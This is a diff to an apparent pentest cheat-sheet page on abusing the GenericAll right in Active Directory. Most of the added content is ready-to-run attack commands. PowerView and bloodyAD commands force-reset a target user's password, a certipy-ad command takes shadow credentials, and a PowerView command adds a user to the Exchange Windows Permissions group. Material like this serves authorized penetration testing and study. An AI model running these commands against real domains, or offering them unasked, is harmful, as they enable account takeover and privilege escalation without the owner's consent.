@@ -1,20 +1,48 @@
 ---
 title: "GenericAll"
 date: 2024-7-12
-tags: ["GenericAll", "active driectory", "ad", "Windows"]
+tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
 ---
 
 ---
-### Using PowerView.ps1 
+### Import PowerView.ps1 
 
 ```powershell
 . .\PowerView.ps1
 ```
 
+### Abuse #1 : Change Target User Password 
+
+#### From Windows
+
+```powershell
+$pass = ConvertTo-SecureString 'password' -AsPlainText -Force 
+```
+
+```powershell
+Set-DomainUserPassword -Identity <target_user> -AccountPassword $pass
+```
+
+#### From Linux
+
+[bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
+```
+
+### Abuse #2 : Get shawdow credentials (From Linux)
+
+```bash
+sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -k -account <TARGET_USER> -target <DC>
+```
+
+### Abuse #3 : Add user to group
+
 #### Authenticated
 
 ```powershell
-# Add user to group (e.g. Exchange Windows Permissions)
+# For example 'Exchange Windows Permissions'
 Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members USER
 ```
 
